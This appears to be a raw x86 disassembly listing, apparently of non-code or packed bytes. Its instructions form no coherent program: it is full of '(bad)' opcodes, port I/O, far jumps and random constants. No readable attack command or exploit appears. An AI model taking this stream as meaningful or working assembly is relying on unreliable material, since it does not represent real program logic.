  412c79:	fisttp DWORD PTR [esi+eax*4+0x7aea9832]
  412c80:	scas   al,BYTE PTR es:[edi]
  412c81:	jne    0x412cc9
  412c83:	ja     0x412c7b
  412c85:	(bad)  
  412c86:	xor    bh,BYTE PTR [ebx]
  412c88:	jg     0x412c0a
  412c8a:	clc    
  412c8b:	pusha  
  412c8c:	dec    ebx
  412c8d:	dec    esi
  412c8e:	repnz (bad) 
  412c90:	out    0x71,eax
  412c92:	rcl    DWORD PTR [eax+0x6e9b4fd6],0x74
  412c99:	pop    eax
  412c9a:	adc    DWORD PTR [eax+0x6e],esp
  412c9d:	sbb    dl,0xde
  412ca0:	push   ebx
  412ca1:	vpxor  ymm3,ymm2,ymm7
  412ca5:	sti    
  412ca6:	test   DWORD PTR [ebp+0x61],edi
  412ca9:	dec    edx
  412caa:	addr16 mov esi,0x2fef5e30
  412cb0:	mov    al,ds:0xa623324c
  412cb5:	leave  
  412cb6:	add    esp,DWORD PTR [eax-0x64]
  412cb9:	test   BYTE PTR [ecx-0x5d],0xb0
  412cbd:	mov    ah,0x74
  412cbf:	or     ebp,ebx
  412cc1:	mov    cl,0x2d
  412cc3:	mov    eax,0xaf684d04
  412cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cc9:	cld    
  412cca:	movd   mm0,ebp
  412ccd:	jmp    0x412c8a
  412ccf:	lock jecxz 0x412c70
  412cd2:	push   edi
  412cd3:	fcomp  st(6)
  412cd5:	out    dx,al
  412cd6:	inc    ebx
  412cd7:	pop    es
  412cd8:	or     DWORD PTR [ebx],0x3821e3c8
  412cde:	sar    esi,cl
  412ce0:	jae    0x412d1b
  412ce2:	out    0x3e,al
  412ce4:	call   0x516d444c
  412ce9:	cmp    eax,0xd721a9e6
  412cee:	pop    ss
  412cef:	sub    eax,0x24cbeb6
  412cf4:	mov    edx,fs
  412cf6:	dec    edi
  412cf7:	(bad)  
  412cf8:	cdq    
  412cf9:	dec    ebx
  412cfa:	fs push ecx
  412cfc:	push   edx
  412cfd:	loop   0x412ce4
  412cff:	xor    edx,edx
  412d01:	cwde   
  412d02:	mov    ds,edx
  412d04:	rcl    BYTE PTR [eax+0x10],cl
  412d07:	push   edx
  412d08:	add    BYTE PTR [edi],ah
  412d0a:	sub    bh,BYTE PTR [eax+ebp*1]
  412d0d:	jl     0x412d0a
  412d0f:	mov    esi,0x360379ac
  412d14:	mov    edi,0x50ee165b
  412d19:	cli    
  412d1a:	mov    dl,0x8d
  412d1c:	retf   
  412d1d:	ds jmp 0x4b9b:0x4c78f6d5
  412d25:	in     al,dx
  412d26:	retf   
  412d27:	iret   
  412d28:	cdq    
  412d29:	(bad)  
  412d2a:	cmc    
  412d2b:	xor    al,0xa4
  412d2d:	pushf  
  412d2e:	cdq    
  412d2f:	clc    
  412d30:	out    0x48,eax
  412d32:	ficom  DWORD PTR [esi]
  412d34:	ss cwde 
  412d36:	cmp    edx,DWORD PTR [edx-0x70fcfa58]
  412d3c:	pop    edi
  412d3d:	push   edx
  412d3e:	arpl   WORD PTR [edx+0x3338e882],bx
  412d44:	xor    eax,0xe7671757
  412d49:	popa   
  412d4a:	clc    
  412d4b:	jp     0x412dc2
  412d4d:	inc    ebp
  412d4e:	mov    dl,0x44
  412d50:	fmul   DWORD PTR [ebx-0x72710dad]
  412d56:	mov    ebp,0xee22b48
  412d5b:	and    eax,0xfeabfb27
  412d60:	shl    BYTE PTR [ebx+edx*2-0x51becf2],0xcf
  412d68:	push   es
  412d69:	or     eax,ebp
  412d6b:	(bad)  
  412d6c:	retf   
  412d6d:	dec    edi
  412d6e:	cwde   
  412d6f:	adc    bl,dh
  412d71:	mov    bh,BYTE PTR [ecx]
  412d73:	sub    al,0xcd
  412d75:	adc    DWORD PTR [ebx+0x6f],0xffffffde
  412d79:	mov    cl,0x26
  412d7b:	inc    edx
  412d7c:	fcmovbe st,st(0)
  412d7e:	xor    DWORD PTR [edi+0x5],edi
  412d81:	adc    edx,DWORD PTR [ebx-0x102f131d]
  412d87:	adc    BYTE PTR [ebx+0x65],cl
  412d8a:	xchg   esi,eax
  412d8b:	mov    ds:0x2b8db644,eax
  412d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d91:	xor    ebp,DWORD PTR [ecx+edi*4-0x45a8402f]
  412d98:	dec    eax
  412d99:	dec    esi
  412d9a:	in     eax,dx
  412d9b:	dec    ebp
  412d9c:	ror    DWORD PTR [ebp-0x7bb766f2],1
  412da2:	xor    BYTE PTR cs:[edx-0x32],cl
  412da6:	xchg   edx,eax
  412da7:	repz out dx,al
  412da9:	stos   BYTE PTR es:[edi],al
  412daa:	jp     0x412d6d
  412dac:	fwait
  412dad:	pop    edi
  412dae:	stos   BYTE PTR es:[edi],al
  412daf:	fnsave [ecx]
  412db1:	imul   ecx,esp,0x2930ba5
  412db7:	push   ds
  412db8:	sahf   
  412db9:	stos   BYTE PTR es:[edi],al
  412dba:	push   cs
  412dbb:	or     edx,DWORD PTR [esi+0xf]
  412dbe:	jg     0x412d6d
  412dc0:	adc    al,0xe7
  412dc2:	xor    ebp,ebp
  412dc4:	push   ss
  412dc5:	js     0x412dc6
  412dc7:	ss pop esi
  412dc9:	inc    ebp
  412dca:	lock loopne 0x412dbd
  412dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dce:	sbb    ecx,DWORD PTR [eax-0x5707124]
  412dd4:	stc    
  412dd5:	dec    esp
  412dd6:	test   BYTE PTR [ecx-0x53dc21c9],al
  412ddc:	pop    edi
  412ddd:	or     esp,ebx
  412ddf:	cmp    DWORD PTR [ebp+0x5a3abc3c],eax
  412de5:	mov    ch,0xfc
  412de7:	out    0x4d,al
  412de9:	jecxz  0x412e04
  412deb:	add    esp,DWORD PTR [esi]
  412ded:	and    eax,0x8f5b0d30
  412df2:	inc    ebp
  412df3:	xchg   esp,eax
  412df4:	(bad)  
  412df5:	call   0x935f85a6
  412dfa:	fwait
  412dfb:	int3   
  412dfc:	xor    BYTE PTR [ecx],bl
  412dfe:	mov    BYTE PTR [esi],0x59
  412e01:	adc    ah,BYTE PTR [edx-0x3]
  412e04:	sub    BYTE PTR [ecx+eax*2],ah
  412e07:	sub    ah,BYTE PTR [edx-0x7675240a]
  412e0d:	pop    ss
  412e0e:	adc    dl,0xf
  412e11:	stc    
  412e12:	in     al,0x42
  412e14:	and    eax,0xb0dab52f
  412e19:	cmp    esp,DWORD PTR [eax]
  412e1b:	sbb    eax,esi
  412e1d:	dec    edx
  412e1e:	mov    ebx,0xde42c2b6
  412e23:	push   eax
  412e24:	(bad)  
  412e25:	mov    ecx,0x7fdffbb5
  412e2a:	dec    ebp
  412e2b:	dec    eax
  412e2c:	push   cs
  412e2d:	fst    DWORD PTR [esp+eax*2]
  412e30:	mov    eax,0x7323d0a1
  412e35:	stos   DWORD PTR es:[edi],eax
  412e36:	xchg   esp,eax
  412e37:	push   ecx
  412e38:	pop    esi
  412e39:	xor    bh,BYTE PTR ds:0x52082f3b
  412e3f:	mov    al,0x57
  412e41:	pop    eax
  412e42:	stos   BYTE PTR es:[edi],al
  412e43:	addr16 adc al,0xbf
  412e46:	or     DWORD PTR [esi+eiz*2-0x55b7eb01],0x8a10d338
  412e51:	les    ebx,FWORD PTR [ecx]
  412e53:	pop    esp
  412e54:	sbb    ah,al
  412e56:	push   cs
  412e57:	loop   0x412e6f
  412e59:	mov    bh,0xe0
  412e5b:	jnp    0x412e80
  412e5d:	shr    edx,cl
  412e5f:	mov    al,ds:0xc1811e4c
  412e64:	inc    edi
  412e65:	enter  0xdd65,0xf0
  412e69:	xchg   edx,eax
  412e6a:	je     0x412e8b
  412e6c:	hlt    
  412e6d:	ins    DWORD PTR es:[edi],dx
  412e6e:	test   al,0x6b
  412e70:	icebp  
  412e71:	cmp    eax,0x39a28a43
  412e76:	or     eax,0x92b9a28
  412e7b:	fistp  QWORD PTR [ecx]
  412e7d:	xchg   BYTE PTR [esi-0x77],al
  412e80:	ins    DWORD PTR es:[edi],dx
  412e81:	sub    al,0xc2
  412e83:	push   esp
  412e84:	dec    esp
  412e85:	fiadd  WORD PTR [edx+0x1e]
  412e88:	or     eax,0x2d6d14e3
  412e8d:	mov    dl,BYTE PTR [esi-0xa]
  412e90:	xchg   esp,eax
  412e91:	enter  0x7f51,0xd0
  412e95:	bound  ebp,QWORD PTR [esi+0x79425738]
  412e9b:	jo     0x412e96
  412e9d:	ret    
  412e9e:	mov    ecx,0xc563078b
  412ea3:	pop    ecx
  412ea4:	(bad)  
  412ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ea6:	in     al,0xb8
  412ea8:	xchg   ecx,eax
  412ea9:	push   ebp
  412eaa:	or     DWORD PTR [ecx-0x77],esi
  412ead:	and    DWORD PTR [ebx],ecx
  412eaf:	shr    DWORD PTR [edi+0x3e],1
  412eb2:	sti    
  412eb3:	xchg   ebp,eax
  412eb4:	stc    
  412eb5:	pusha  
  412eb6:	das    
  412eb7:	or     ebp,DWORD PTR [edx-0x6ed668ed]
  412ebd:	mov    ebp,DWORD PTR [ebx+0x51]
  412ec0:	leave  
  412ec1:	popa   
  412ec2:	(bad)  
  412ec3:	jnp    0x412e53
  412ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec6:	out    0x11,al
  412ec8:	call   0xbd8bfa91
  412ecd:	loop   0x412ebe
  412ecf:	cmp    edi,ebx
  412ed1:	leave  
  412ed2:	loopne 0x412f36
  412ed4:	xor    ecx,DWORD PTR [edx+0x7488cb88]
  412eda:	push   cs
  412edb:	idiv   BYTE PTR [esi-0x42]
  412ede:	add    DWORD PTR [eax-0x69],ecx
  412ee1:	out    dx,al
  412ee2:	inc    edx
  412ee3:	out    dx,eax
  412ee4:	fidiv  DWORD PTR [eax-0x67706e1a]
  412eea:	int3   
  412eeb:	repz jge 0x412f36
  412eee:	mov    BYTE PTR [ebx],cl
  412ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ef1:	mov    al,BYTE PTR [esp+edi*1-0x4f]
  412ef5:	jecxz  0x412eca
  412ef7:	or     DWORD PTR [ebp+eiz*1+0x41],esp
  412efb:	retf   
  412efc:	loope  0x412f16
  412efe:	pop    ecx
  412eff:	jne    0x412ebd
  412f01:	cwde   
  412f02:	dec    ebp
  412f03:	aas    
  412f04:	push   edi
  412f05:	fucompp 
  412f07:	push   0xf06b32da
  412f0c:	sbb    ch,BYTE PTR [ebx-0x4bbe081d]
  412f12:	adc    BYTE PTR [ebx-0x7a7842b1],ah
  412f18:	loop   0x412f8d
  412f1a:	sar    DWORD PTR [edi-0x14],0x65
  412f1e:	cs ja  0x412ea1
  412f21:	cmp    edx,DWORD PTR [ebx]
  412f23:	mov    esi,0x8fddaf14
  412f28:	inc    ebx
  412f29:	inc    edx
  412f2a:	fisub  WORD PTR [eax]
  412f2c:	push   ecx
  412f2d:	xor    al,BYTE PTR [ecx+edi*8-0x69]
  412f31:	push   eax
  412f32:	jle    0x412ed6
  412f34:	inc    edx
  412f35:	add    bh,ah
  412f37:	add    cl,BYTE PTR [edx*2+0xce2f36a]
  412f3e:	ffree  st(7)
  412f40:	sub    ah,0x5d
  412f43:	int3   
  412f44:	push   0xe86b3e38
  412f49:	mov    eax,0xae21d74c
  412f4e:	xor    al,0x3a
  412f50:	xor    cl,al
  412f52:	cwde   
  412f53:	and    al,0x37
  412f55:	(bad)  
  412f56:	sbb    al,0x6d
  412f58:	push   0xb67063c6
  412f5d:	test   al,0x2a
  412f5f:	scas   eax,DWORD PTR es:[edi]
  412f60:	jo     0x412f99
  412f62:	outs   dx,DWORD PTR ds:[esi]
  412f63:	loopne 0x412faf
  412f65:	pop    esp
  412f66:	mov    esi,0xc3322a82
  412f6b:	jne    0x412f2c
  412f6d:	pop    edx
  412f6e:	inc    esi
  412f6f:	(bad)  
  412f70:	push   eax
  412f71:	scas   al,BYTE PTR es:[edi]
  412f72:	jae    0x412f1b
  412f74:	fcom   st(2)
  412f76:	adc    ebx,DWORD PTR [edx]
  412f78:	loope  0x412f29
  412f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f7b:	stos   BYTE PTR es:[edi],al
  412f7c:	ror    BYTE PTR [esi+0xa],1
  412f7f:	sbb    bl,bh
  412f81:	retf   0xbac6
  412f84:	push   ecx
  412f85:	shl    DWORD PTR [edx],cl
  412f87:	dec    DWORD PTR [edx]
  412f89:	mov    edi,0x9f5b856f
  412f8e:	mov    DWORD PTR [ebx],esp
  412f90:	push   esp
  412f91:	test   al,0xd0
  412f93:	or     al,0xbc
  412f95:	fld    TBYTE PTR [esi]
  412f97:	cmp    eax,0xeeaf5988
  412f9c:	pusha  
  412f9d:	sbb    bl,0x25
  412fa0:	pop    ebx
  412fa1:	jae    0x412f82
  412fa3:	cli    
  412fa4:	shr    BYTE PTR [ebx+0x2d3f8bdd],0xce
  412fab:	and    DWORD PTR [edx+0x6f],esp
  412fae:	push   ebp
  412faf:	push   esi
  412fb0:	xchg   ecx,eax
  412fb1:	mov    al,ds:0x57ec1ffa
  412fb6:	xor    BYTE PTR [edx],dl
  412fb8:	sbb    dh,cl
  412fba:	xor    dh,BYTE PTR [edx-0x9f19cf]
  412fc0:	push   eax
  412fc1:	jge    0x412f87
  412fc3:	fcmovu st,st(1)
  412fc5:	stos   DWORD PTR es:[edi],eax
  412fc6:	nop
  412fc7:	inc    ebp
  412fc8:	sbb    DWORD PTR [edx],esi
  412fca:	out    dx,al
  412fcb:	leave  
  412fcc:	lahf   
  412fcd:	xchg   edi,eax
  412fce:	loop   0x412fb2
  412fd0:	cmp    ecx,DWORD PTR [ebx+0x403bc09d]
  412fd6:	cmp    al,0xa4
  412fd8:	push   edx
  412fd9:	or     DWORD PTR [eax],ebx
  412fdb:	das    
  412fdc:	pop    ecx
  412fdd:	mov    ?,WORD PTR ds:0xebf843aa
  412fe3:	mov    edx,DWORD PTR [esi-0x50a70f45]
  412fe9:	inc    esi
  412fea:	je     0x412fda
  412fec:	mov    WORD PTR [edi-0x7209d46c],ds
  412ff2:	nop
  412ff3:	int    0x59
  412ff5:	cmp    al,0xce
  412ff7:	and    ah,BYTE PTR [eax+0x2b]
  412ffa:	fs push edi
  412ffc:	mov    ch,0x48
  412ffe:	jne    0x413044
  413000:	lea    edi,[ebx-0x53]
  413003:	jle    0x413003
  413005:	sar    DWORD PTR [ebx+edx*1-0x5],1
  413009:	lahf   
  41300a:	mov    eax,ds:0xb65e5b0c
  41300f:	jecxz  0x413059
  413011:	sub    al,0xa2
  413013:	jmp    0x16b1:0x7e944a9f
  41301a:	(bad)  
  41301b:	lods   al,BYTE PTR ds:[esi]
  41301c:	jno    0x413061
  41301e:	sbb    eax,ecx
  413020:	sub    dl,al
  413022:	out    dx,eax
  413023:	mov    bl,0x25
  413025:	mov    es,ebp
  413027:	cmp    al,0x41
  413029:	xchg   esp,eax
  41302a:	ficom  WORD PTR [edi-0x59]
  41302d:	ss (bad) 
  413030:	push   es
  413031:	ss jle 0x41302c
  413034:	xchg   ebp,eax
  413035:	add    esp,DWORD PTR [eax+0x4f]
  413038:	lahf   
  413039:	sar    bh,cl
  41303b:	fs ss das 
  41303e:	cdq    
  41303f:	inc    esp
  413040:	bound  esi,QWORD PTR [eax+edx*1]
  413043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413044:	or     DWORD PTR [ebx-0x2cdf897f],0x32
  41304b:	rcl    esp,cl
  41304d:	inc    ecx
  41304e:	out    dx,eax
  41304f:	xor    BYTE PTR [esi],dl
  413051:	int3   
  413052:	call   0xfd3:0xdd7f1730
  413059:	mov    al,0x58
  41305b:	push   es
  41305c:	fild   WORD PTR [edx+0xb]
  41305f:	icebp  
  413060:	dec    edi
  413061:	mov    bh,0xfb
  413063:	in     eax,dx
  413064:	mov    bl,0xee
  413066:	push   edx
  413067:	adc    dl,BYTE PTR [ebp+0x2e387165]
  41306d:	lock xor ch,BYTE PTR [ebp-0x6620209a]
  413074:	ja     0x413045
  413076:	inc    ebp
  413077:	push   DWORD PTR [eiz*1+0x43196488]
  41307e:	les    ebp,FWORD PTR [esp+edi*4]
  413081:	dec    ebp
  413083:	adc    al,0xf3
  413085:	mov    cl,0x10
  413087:	jne    0x4130ef
  413089:	cmp    DWORD PTR [esi+0x2866772b],0xffffffdb
  413090:	push   esi
  413091:	aaa    
  413092:	jae    0x4130b7
  413094:	mov    edx,0xbfb61d83
  413099:	out    0xea,eax
  41309b:	jmp    0x41305b
  41309d:	lods   eax,DWORD PTR ds:[esi]
  41309e:	enter  0x17c2,0xbb
  4130a2:	mov    bl,BYTE PTR [ebx+0x55]
  4130a5:	popa   
  4130a6:	jmp    0x4abb:0xe2629fa2
  4130ad:	adc    BYTE PTR gs:[ebx],bl
  4130b0:	jno    0x41310c
  4130b2:	pop    edx
  4130b3:	and    al,0x23
  4130b5:	sbb    esp,DWORD PTR [ebx+edi*1-0x7c]
  4130b9:	jmp    0x4130dc
  4130bb:	mov    bl,0xc0
  4130bd:	ret    
  4130be:	inc    edi
  4130bf:	je     0x413114
  4130c1:	mov    dh,0xe6
  4130c3:	push   0x4d
  4130c5:	int    0x8e
  4130c7:	imul   eax,DWORD PTR [ecx+0x78e174d2],0xc5d657a
  4130d1:	dec    edx
  4130d2:	sub    ebx,DWORD PTR [edx+0x4766bf2c]
  4130d8:	push   esi
  4130d9:	adc    dh,ah
  4130db:	xchg   BYTE PTR [edx],dl
  4130dd:	mov    ch,0x5f
  4130df:	rcr    ecx,1
  4130e1:	cld    
  4130e2:	pop    ebp
  4130e3:	push   cs
  4130e4:	(bad)  
  4130e5:	xchg   edi,eax
  4130e6:	(bad)  
  4130e7:	test   BYTE PTR [eax+0x3],0xf
  4130eb:	add    al,0x3b
  4130ed:	pop    ss
  4130ee:	iret   
  4130ef:	hlt    
  4130f0:	fisttp WORD PTR [ebp-0x31f0d1d2]
  4130f6:	xchg   esi,eax
  4130f7:	std    
  4130f8:	or     DWORD PTR [edi+edi*8+0x6feb996],edx
  4130ff:	mov    bh,0x2
  413101:	aam    0xa7
  413103:	(bad)  
  413105:	push   edi
  413106:	and    al,0xcf
  413108:	lea    esp,[esi+edi*8-0x6d]
  41310c:	stc    
  41310d:	xchg   edi,eax
  41310e:	pop    esp
  41310f:	int3   
  413110:	fistp  DWORD PTR [edx]
  413112:	lock pushf 
  413114:	xor    cl,BYTE PTR [eax-0x3512fea0]
  41311a:	pop    eax
  41311b:	(bad)  
  41311d:	pop    es
  41311e:	sub    al,0xf5
  413120:	mov    ecx,0x85fe4e9e
  413125:	mov    cs,WORD PTR [ecx]
  413127:	pop    ds
  413128:	inc    edi
  413129:	pop    esi
  41312a:	sub    esp,DWORD PTR [esi]
  41312c:	(bad)  
  41312d:	sub    dl,BYTE PTR [esi+eax*4]
  413130:	jno    0x4130c5
  413132:	mov    ch,0x6b
  413134:	and    ch,dl
  413136:	aad    0x81
  413138:	dec    esp
  413139:	(bad)  
  41313a:	outs   dx,DWORD PTR ds:[esi]
  41313b:	xchg   esi,eax
  41313c:	cmp    edx,DWORD PTR [ebp+0x15]
  41313f:	mov    al,ds:0x3a3bf7d1
  413144:	dec    ebx
  413145:	dec    edx
  413146:	pop    edi
  413147:	inc    eax
  413148:	sti    
  413149:	call   0x512c:0x12a42981
  413150:	push   ebx
  413151:	daa    
  413152:	mov    edx,0x620ca734
  413157:	or     al,0x2
  413159:	addr16 mov dh,0x79
  41315c:	aad    0x32
  41315e:	adc    al,0xb7
  413160:	cld    
  413161:	mov    al,0x1
  413163:	pop    eax
  413164:	or     ch,al
  413166:	cli    
  413167:	pop    ds
  413168:	les    ecx,FWORD PTR [ecx+0x35]
  41316b:	add    bl,BYTE PTR [eax-0x5df60941]
  413171:	daa    
  413172:	addr16 mov dh,0xdd
  413175:	mov    ecx,DWORD PTR [edx-0x593737b1]
  41317b:	sub    DWORD PTR [ecx-0x17],esi
  41317e:	aas    
  41317f:	push   edx
  413180:	mov    cl,0xdb
  413182:	sbb    eax,0x2dfaa9c1
  413187:	push   ds
  413188:	rol    DWORD PTR [esi],0xed
  41318b:	push   edi
  41318c:	lahf   
  41318d:	aad    0x19
  41318f:	push   esi
  413190:	jecxz  0x413142
  413192:	mov    cl,0x2c
  413194:	arpl   WORD PTR [esp+edi*4-0x30],di
  413198:	add    eax,0xd7cea0a9
  41319d:	jg     0x4131db
  41319f:	and    al,0x26
  4131a1:	pop    ebx
  4131a2:	fwait
  4131a3:	popa   
  4131a4:	test   al,0x2c
  4131a6:	pop    ebx
  4131a7:	inc    ax
  4131a9:	test   BYTE PTR [edx-0x23b72daa],ah
  4131af:	cmp    ch,BYTE PTR [eax-0x2e]
  4131b2:	scas   eax,DWORD PTR es:[edi]
  4131b3:	jae    0x4131f7
  4131b5:	daa    
  4131b6:	inc    ecx
  4131b7:	pop    ds
  4131b8:	sbb    DWORD PTR [eax],edx
  4131ba:	pop    esp
  4131bb:	sbb    edi,DWORD PTR [esi]
  4131bd:	aas    
  4131be:	adc    eax,0xd22382d5
  4131c3:	imul   esi,ecx,0x86c425cf
  4131c9:	ss scas eax,DWORD PTR es:[edi]
  4131cb:	fstp   DWORD PTR [ebx-0x17cdd147]
  4131d1:	xlat   BYTE PTR ds:[ebx]
  4131d2:	xor    DWORD PTR [ebx-0x63],ebp
  4131d5:	fwait
  4131d6:	push   es
  4131d7:	cmc    
  4131d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131d9:	test   al,0x4f
  4131db:	add    eax,0x94312629
  4131e0:	mov    bh,0x38
  4131e2:	jg     0x4131e9
  4131e4:	or     DWORD PTR [edi+ebp*1-0x75],0x6c
  4131e9:	push   es
  4131ea:	outs   dx,BYTE PTR ds:[esi]
  4131eb:	inc    esi
  4131ec:	jecxz  0x413232
  4131ee:	pop    es
  4131ef:	mov    dh,0x25
  4131f1:	leave  
  4131f2:	and    eax,0x871bdd12
  4131f7:	jb     0x413204
  4131f9:	test   eax,0xf1a4f626
  4131fe:	cwde   
  4131ff:	jbe    0x413206
  413201:	or     dl,BYTE PTR [edx+0x51]
  413204:	add    al,0xd0
  413206:	daa    
  413207:	scas   al,BYTE PTR es:[edi]
  413208:	out    0x81,eax
  41320a:	add    al,0x62
  41320c:	std    
  41320d:	jns    0x413256
  41320f:	xchg   esi,eax
  413210:	scas   al,BYTE PTR es:[edi]
  413211:	loop   0x413281
  413213:	or     esi,ebx
  413215:	add    eax,0x542c3256
  41321a:	cmp    DWORD PTR [ebx+0x63],esp
  41321d:	or     al,0x7e
  41321f:	jmpw   0x4964
  413223:	add    al,0x64
  413225:	test   al,0x3b
  413227:	test   eax,0x2ff2748b
  41322c:	or     eax,ebx
  41322e:	out    0xb4,al
  413230:	in     al,0xe6
  413232:	ds out 0x4d,eax
  413235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413236:	(bad)  
  413237:	shl    BYTE PTR [edx],cl
  413239:	push   es
  41323a:	mov    ah,0x5
  41323c:	mov    edi,0x8f53daaf
  413241:	jns    0x41329e
  413243:	push   es
  413244:	dec    ebp
  413245:	sbb    cl,BYTE PTR [ebx+0x4d]
  413248:	pushf  
  413249:	push   0xdce8b319
  41324e:	mov    ebx,0x77fe1cb0
  413253:	dec    eax
  413254:	test   DWORD PTR [ebp-0x31],ebx
  413257:	stos   BYTE PTR es:[edi],al
  413258:	xor    dh,BYTE PTR [edi-0x6c2a2a7d]
  41325e:	xchg   edx,eax
  41325f:	jle    0x41326a
  413261:	jbe    0x413238
  413263:	shl    BYTE PTR [esi-0x11],cl
  413266:	push   ebx
  413267:	jecxz  0x413263
  413269:	push   esp
  41326a:	pusha  
  41326b:	and    bl,BYTE PTR ds:0x10d313ee
  413271:	outs   dx,BYTE PTR ds:[esi]
  413272:	and    esi,0x24
  413275:	sbb    esi,DWORD PTR [edx]
  413277:	(bad)  
  413278:	(bad)  
  41327a:	sbb    ebp,DWORD PTR [ebp+0x5d6f3f73]
  413280:	test   cl,ah
  413282:	adc    dh,BYTE PTR [esi-0x64]
  413285:	out    0x98,al
  413287:	sbb    eax,0xecb21735
  41328c:	shl    BYTE PTR ds:0x8fce268e,cl
  413292:	fisttp QWORD PTR [ebp+0x2192d4ee]
  413298:	mov    WORD PTR [ebp+0x5567e6e6],ss
  41329e:	inc    esp
  41329f:	sub    BYTE PTR [eax],dl
  4132a1:	jbe    0x4132b8
  4132a3:	jmp    DWORD PTR [edi]
  4132a5:	jmp    0x41326d
  4132a7:	jne    0x41322a
  4132a9:	lods   eax,DWORD PTR ds:[esi]
  4132aa:	rcr    BYTE PTR [ebx+0xcc0c49],0xc9
  4132b1:	push   es
  4132b2:	xor    DWORD PTR [ebp+0x29],eax
  4132b5:	add    al,0x14
  4132b7:	inc    ecx
  4132b8:	mov    ebp,0xc201e69c
  4132bd:	(bad)  
  4132bf:	lods   al,BYTE PTR ds:[esi]
  4132c0:	xchg   BYTE PTR [ebx],dh
  4132c2:	mov    edi,ds
  4132c4:	int3   
  4132c5:	imul   ebp,esp,0x9ee8d95
  4132cb:	(bad)  
  4132cc:	neg    DWORD PTR [esi+eiz*8]
  4132cf:	or     ebp,DWORD PTR [edi+0x6c]
  4132d2:	jne    0x413279
  4132d4:	push   es
  4132d5:	or     DWORD PTR [edx-0x5e],esp
  4132d8:	adc    eax,esi
  4132da:	outs   dx,DWORD PTR ds:[esi]
  4132db:	jge    0x41331b
  4132dd:	(bad)  
  4132de:	clc    
  4132df:	out    0x49,eax
  4132e1:	bound  esi,QWORD PTR [esi-0xc]
  4132e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132e5:	outs   dx,DWORD PTR ds:[esi]
  4132e6:	dec    ebx
  4132e7:	fstp   TBYTE PTR [eax+0x1d]
  4132ea:	out    dx,eax
  4132eb:	(bad)  
  4132ed:	(bad)  
  4132ee:	pop    edi
  4132ef:	inc    ecx
  4132f0:	inc    ecx
  4132f1:	sti    
  4132f2:	push   es
  4132f3:	aaa    
  4132f4:	sbb    ch,cl
  4132f6:	inc    esp
  4132f7:	mov    WORD PTR [ebx],ds
  4132f9:	jns    0x4132cd
  4132fb:	and    dl,BYTE PTR [edx-0xe]
  4132fe:	and    DWORD PTR [ecx],esp
  413300:	test   esi,edi
  413302:	mov    eax,0x79634a55
  413307:	jle    0x4132fb
  413309:	jmp    0x41335a
  41330b:	(bad)
  41330f:	in     al,0xe9
  413311:	or     bl,BYTE PTR [edi+0x28777ceb]
  413317:	add    al,0x51
  413319:	out    dx,eax
  41331a:	loope  0x4132ea
  41331c:	xchg   edi,eax
  41331d:	or     esi,esp
  41331f:	xlat   BYTE PTR ds:[ebx]
  413320:	out    dx,eax
  413321:	jp     0x41337b
  413323:	inc    edi
  413324:	int    0x51
  413326:	mov    ecx,0x678344d9
  41332b:	jmp    0x413342
  41332d:	pop    esp
  41332e:	xchg   ebx,esi
  413330:	mov    dl,0xd7
  413332:	push   esi
  413333:	xor    eax,0xbf1d928
  413338:	cmp    ah,cl
  41333a:	jle    0x413319
  41333c:	mov    dl,0xec
  41333e:	cli    
  41333f:	fmul   DWORD PTR [eax]
  413341:	sub    BYTE PTR [edx-0x74739449],al
  413347:	popf   
  413348:	sbb    eax,0xca6c0558
  41334d:	sub    BYTE PTR [esi],0xdb
  413350:	push   eax
  413351:	rcl    BYTE PTR [esi-0x69],cl
  413354:	xor    al,0x46
  413356:	pop    esp
  413357:	test   BYTE PTR [ecx+0x34],dl
  41335a:	sub    al,0x1c
  41335c:	sbb    edx,DWORD PTR [edx]
  41335e:	push   eax
  41335f:	push   edx
  413360:	fst    st(3)
  413362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413363:	gs cdq 
  413365:	in     eax,dx
  413366:	clc    
  413367:	sahf   
  413368:	imul   esi,DWORD PTR [edi+0x60a7fbf1],0x62
  41336f:	pusha  
  413370:	and    edx,DWORD PTR ss:[edi+0x23a4795f]
  413377:	add    DWORD PTR [edx+ecx*1-0x51],edx
  41337b:	xor    DWORD PTR [esi+0x811f2de],esp
  413381:	push   ss
  413382:	cmp    eax,0xe9c1c7c
  413387:	mov    ds:0x11e31d28,al
  41338c:	nop
  41338d:	jge    0x413326
  41338f:	ret    
  413390:	xor    cl,BYTE PTR [ebx+0x3690b4e1]
  413396:	pop    eax
  413397:	or     eax,0xe02aa08
  41339c:	inc    eax
  41339d:	push   esi
  41339e:	dec    ebp
  41339f:	inc    ecx
  4133a0:	je     0x413328
  4133a2:	sti    
  4133a3:	and    BYTE PTR [eax+0x6f],cl
  4133a6:	mov    dl,0x99
  4133a8:	push   0xffffffef
  4133aa:	test   BYTE PTR [ebp-0xd],dh
  4133ad:	adc    DWORD PTR [esi+0x2fcb7514],esp
  4133b3:	sub    DWORD PTR [ebx-0x6d3f21fa],0xa1ed6727
  4133bd:	pusha  
  4133be:	repnz dec esp
  4133c0:	dec    ecx
  4133c1:	jg     0x413367
  4133c3:	mov    edi,DWORD PTR [ecx]
  4133c5:	dec    BYTE PTR [ebx-0x42]
  4133c8:	je     0x413432
  4133ca:	inc    edx
  4133cb:	std    
  4133cc:	sbb    dh,ch
  4133ce:	mov    BYTE PTR [eax+eax*4+0x575c5af7],bl
  4133d5:	aad    0x4d
  4133d7:	(bad)  
  4133d8:	sbb    BYTE PTR [ebp+edx*1+0x7],bh
  4133dc:	xchg   ebp,eax
  4133dd:	sbb    eax,DWORD PTR [ebx-0x74c72e2f]
  4133e3:	mov    dl,al
  4133e5:	mov    ecx,0xa3cf7a21
  4133ea:	pop    ss
  4133eb:	retf   
  4133ec:	js     0x4133a7
  4133ee:	xchg   DWORD PTR ds:0xa1351400,edx
